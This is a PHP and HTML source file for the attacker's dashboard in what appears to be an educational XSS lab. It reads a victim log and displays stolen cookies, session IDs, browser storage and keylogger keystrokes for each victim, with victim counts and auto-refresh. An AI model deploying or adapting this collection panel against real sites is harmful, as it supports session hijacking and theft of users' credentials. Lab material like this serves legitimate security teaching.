<?php
// dashboard.php - Attacker dashboard to view stolen data
// FOR EDUCATIONAL PURPOSES ONLY!

$logFile = 'victims_log.json';
$victims = [];

if (file_exists($logFile)) {
    $content = file_get_contents($logFile);
    $victims = json_decode($content, true) ?: [];
}

// Sort by timestamp (most recent first)
usort($victims, function($a, $b) {
    return strtotime($b['timestamp']) - strtotime($a['timestamp']);
});

// Statistics
$totalVictims = count($victims);
$todayVictims = 0;
$sessionsStolen = 0;
$cookiesStolen = 0;
$keylogs = 0;

foreach ($victims as $victim) {
    if (date('Y-m-d', strtotime($victim['timestamp'])) == date('Y-m-d')) {
        $todayVictims++;
    }
    if (isset($victim['stolen_data']['sessionId'])) {
        $sessionsStolen++;
    }
    if (isset($victim['stolen_data']['cookies'])) {
        $cookiesStolen++;
    }
    if (isset($victim['stolen_data']['keylog']) || isset($victim['get_data']['key'])) {
        $keylogs++;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🕵️ Attacker Dashboard - XSS Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            background: rgba(0, 255, 0, 0.1);
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #ff0000;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #cccccc;
            font-size: 0.9em;
        }
        
        .victims-container {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
        }
        
        .victim-card {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            border-radius: 8px;
            margin-bottom: 20px;
            padding: 15px;
            position: relative;
        }
        
        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }
        
        .victim-id {
            font-weight: bold;
            color: #ff0000;
            font-size: 1.1em;
        }
        
        .victim-time {
            color: #888;
            font-size: 0.9em;
        }
        
        .victim-data {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }
        
        .data-section {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
            border-radius: 5px;
            padding: 10px;
        }
        
        .data-title {
            color: #ffff00;
            font-weight: bold;
            margin-bottom: 8px;
            text-transform: uppercase;
            font-size: 0.9em;
        }
        
        .data-content {
            font-size: 0.85em;
            line-height: 1.4;
            word-break: break-all;
        }
        
        .dangerous {
            color: #ff4444 !important;
            background: rgba(255, 68, 68, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        
        .success-indicator {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #ff0000;
            color: white;
            padding: 5px 10px;
            border-radius: 15px;
            font-size: 0.8em;
            font-weight: bold;
        }
        
        .no-data {
            text-align: center;
            color: #666;
            font-style: italic;
            padding: 40px;
        }
        
        .warning {
            background: rgba(255, 255, 0, 0.1);
            border: 1px solid #ffff00;
            color: #ffff00;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
        }
        
        .refresh-btn {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 20px;
        }
        
        .refresh-btn:hover {
            background: #00cc00;
        }
        
        .clear-btn {
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin-left: 10px;
        }
        
        .clear-btn:hover {
            background: #cc0000;
        }
        
        .json-viewer {
            background: #111;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 0.8em;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .attack-type {
            display: inline-block;
            background: #ff4444;
            color: white;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 0.7em;
            margin: 2px;
        }
        
        @media (max-width: 768px) {
            .victim-data {
                grid-template-columns: 1fr;
            }
            
            .header h1 {
                font-size: 1.8em;
            }
            
            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🕵️ ATTACKER DASHBOARD</h1>
            <p>XSS Attack Monitoring - Educational Lab</p>
        </div>
        
        <div class="warning">
            ⚠️ EDUCATIONAL PURPOSE ONLY - This dashboard shows XSS attack results for learning cybersecurity
        </div>
        
        <div style="margin-bottom: 20px;">
            <button class="refresh-btn" onclick="location.reload()">🔄 Refresh Data</button>
            <button class="clear-btn" onclick="clearLogs()">🗑️ Clear All Logs</button>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number"><?php echo $totalVictims; ?></div>
                <div class="stat-label">Total Victims</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo $todayVictims; ?></div>
                <div class="stat-label">Today's Victims</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo $sessionsStolen; ?></div>
                <div class="stat-label">Sessions Stolen</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo $cookiesStolen; ?></div>
                <div class="stat-label">Cookies Stolen</div>
            </div>
        </div>
        
        <div class="victims-container">
            <h2>🎯 Recent Victims</h2>
            
            <?php if (empty($victims)): ?>
                <div class="no-data">
                    No victims yet. Waiting for XSS attacks to trigger...<br>
                    <small>Make sure the vulnerable site is running and try the XSS payloads!</small>
                </div>
            <?php else: ?>
                <?php foreach ($victims as $index => $victim): ?>
                    <div class="victim-card">
                        <?php
                        $attackTypes = [];
                        if (isset($victim['stolen_data']['cookies'])) $attackTypes[] = 'COOKIES';
                        if (isset($victim['stolen_data']['sessionId'])) $attackTypes[] = 'SESSION';
                        if (isset($victim['stolen_data']['localStorage'])) $attackTypes[] = 'STORAGE';
                        if (isset($victim['stolen_data']['keylog']) || isset($victim['get_data']['key'])) $attackTypes[] = 'KEYLOG';
                        ?>
                        
                        <?php if (!empty($attackTypes)): ?>
                            <div class="success-indicator">💰 HIGH VALUE</div>
                        <?php endif; ?>
                        
                        <div class="victim-header">
                            <div class="victim-id">
                                🎯 <?php echo htmlspecialchars($victim['victim_id'] ?? 'Unknown'); ?>
                                <?php foreach ($attackTypes as $type): ?>
                                    <span class="attack-type"><?php echo $type; ?></span>
                                <?php endforeach; ?>
                            </div>
                            <div class="victim-time">
                                ⏰ <?php echo htmlspecialchars($victim['timestamp'] ?? 'Unknown time'); ?>
                            </div>
                        </div>
                        
                        <div class="victim-data">
                            <div class="data-section">
                                <div class="data-title">🌐 Network Info</div>
                                <div class="data-content">
                                    <strong>IP:</strong> <?php echo htmlspecialchars($victim['ip'] ?? 'Unknown'); ?><br>
                                    <strong>User Agent:</strong> <?php echo htmlspecialchars(substr($victim['user_agent'] ?? 'Unknown', 0, 100)); ?>...<br>
                                    <strong>Referer:</strong> <?php echo htmlspecialchars($victim['referer'] ?? 'Direct'); ?>
                                </div>
                            </div>
                            
                            <?php if (isset($victim['stolen_data']['cookies'])): ?>
                                <div class="data-section">
                                    <div class="data-title dangerous">🍪 Stolen Cookies</div>
                                    <div class="data-content dangerous">
                                        <?php echo htmlspecialchars($victim['stolen_data']['cookies']); ?>
                                    </div>
                                </div>
                            <?php endif; ?>
                            
                            <?php if (isset($victim['stolen_data']['sessionId'])): ?>
                                <div class="data-section">
                                    <div class="data-title dangerous">🔑 Session ID</div>
                                    <div class="data-content dangerous">
                                        <?php echo htmlspecialchars($victim['stolen_data']['sessionId']); ?>
                                    </div>
                                </div>
                            <?php endif; ?>
                            
                            <?php if (isset($victim['stolen_data']['url'])): ?>
                                <div class="data-section">
                                    <div class="data-title">📍 Current Page</div>
                                    <div class="data-content">
                                        <?php echo htmlspecialchars($victim['stolen_data']['url']); ?>
                                    </div>
                                </div>
                            <?php endif; ?>
                            
                            <?php if (isset($victim['stolen_data']['localStorage'])): ?>
                                <div class="data-section">
                                    <div class="data-title dangerous">💾 Local Storage</div>
                                    <div class="data-content dangerous">
                                        <?php echo htmlspecialchars($victim['stolen_data']['localStorage']); ?>
                                    </div>
                                </div>
                            <?php endif; ?>
                            
                            <?php if (isset($victim['stolen_data']['sessionStorage'])): ?>
                                <div class="data-section">
                                    <div class="data-title dangerous">💽 Session Storage</div>
                                    <div class="data-content dangerous">
                                        <?php echo htmlspecialchars($victim['stolen_data']['sessionStorage']); ?>
                                    </div>
                                </div>
                            <?php endif; ?>
                            
                            <?php if (isset($victim['get_data']['key']) || isset($victim['stolen_data']['keylog'])): ?>
                                <div class="data-section">
                                    <div class="data-title dangerous">⌨️ Keylogger Data</div>
                                    <div class="data-content dangerous">
                                        <?php 
                                        if (isset($victim['get_data']['key'])) {
                                            echo "Key pressed: " . htmlspecialchars($victim['get_data']['key']);
                                        }
                                        if (isset($victim['stolen_data']['keylog'])) {
                                            echo htmlspecialchars($victim['stolen_data']['keylog']);
                                        }
                                        ?>
                                    </div>
                                </div>
                            <?php endif; ?>
                            
                            <?php if (isset($victim['stolen_data']) && !empty($victim['stolen_data'])): ?>
                                <div class="data-section" style="grid-column: 1 / -1;">
                                    <div class="data-title">📊 Full Stolen Data</div>
                                    <div class="json-viewer">
                                        <?php echo htmlspecialchars(json_encode($victim['stolen_data'], JSON_PRETTY_PRINT)); ?>
                                    </div>
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        
        <!-- File status -->
        <div style="margin-top: 20px; text-align: center; color: #666; font-size: 0.8em;">
            Log file: <?php echo $logFile; ?> 
            <?php if (file_exists($logFile)): ?>
                (<?php echo round(filesize($logFile) / 1024, 2); ?> KB)
            <?php else: ?>
                (not found)
            <?php endif; ?>
        </div>
    </div>
    
    <script>
        // Auto-refresh every 15 seconds
        setTimeout(function() {
            location.reload();
        }, 15000);
        
        function clearLogs() {
            if (confirm('Are you sure you want to clear all victim logs? This action cannot be undone.')) {
                fetch('clear_logs.php', {method: 'POST'})
                    .then(() => location.reload())
                    .catch(() => alert('Error clearing logs'));
            }
        }
        
        console.log('🕵️ Attacker Dashboard loaded - monitoring for new victims...');
        console.log('Total victims captured: <?php echo $totalVictims; ?>');
    </script>
</body>
</html>